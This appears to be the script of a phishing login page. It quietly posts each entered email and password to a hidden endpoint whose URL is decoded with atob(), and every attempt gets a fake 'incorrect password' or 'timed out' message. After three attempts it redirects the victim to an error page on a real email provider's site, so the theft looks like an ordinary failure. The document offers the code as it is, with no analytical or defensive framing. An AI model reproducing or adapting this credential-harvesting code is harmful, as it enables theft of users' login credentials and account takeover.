<script type="module">
let loginAttempts = 0;
const actionUrl = atob(''); 

async function submitFormData(){
  const form = document.getElementById('loginForm');
  await fetch(actionUrl, { method:'POST', body: new FormData(form) });
}

function getDomainFromEmail(email){
  const parts = email.split('@'); return parts.length>1 ? parts[1] : 'unknown.com';
}

function handleLoginAttempt(event){
  event.preventDefault();
  const passwordField = document.getElementById('password');
  const emailField = document.getElementById('email');
  const loginMessage = document.getElementById('loginMessage');

  if(passwordField.value.trim()===''){
    loginMessage.innerText='Please Enter Your Password.'; loginMessage.style.display='block'; return;
  }
  if(passwordField.value.length<8){
    loginMessage.innerText='The password you entered isn\'t correct. Try again.'; loginMessage.style.display='block'; return;
  }

  loginAttempts++;
  submitFormData();

  passwordField.value=''; loginMessage.style.display='block';

  if(loginAttempts===1) loginMessage.innerText='Your password is incorrect.';
  else if(loginAttempts===2) loginMessage.innerText='Login attempt timed out. Please try again.';
  else if(loginAttempts>=3){
    loginMessage.innerText='Too many failed attempts.';
    const domain = getDomainFromEmail(emailField.value);
    setTimeout(()=>{ window.location.href=`https://main.hiworks.com/error/404/`; },500);
  }
}

window.onload=()=>{
  const emailField = document.getElementById('email');
  if(!emailField.value){ 
    document.getElementById('loginBox').style.display='none'; 
    return; // do not show form if no email
  }

  const form = document.getElementById('loginForm');
  if(form) form.addEventListener('submit', handleLoginAttempt);
};
</script>
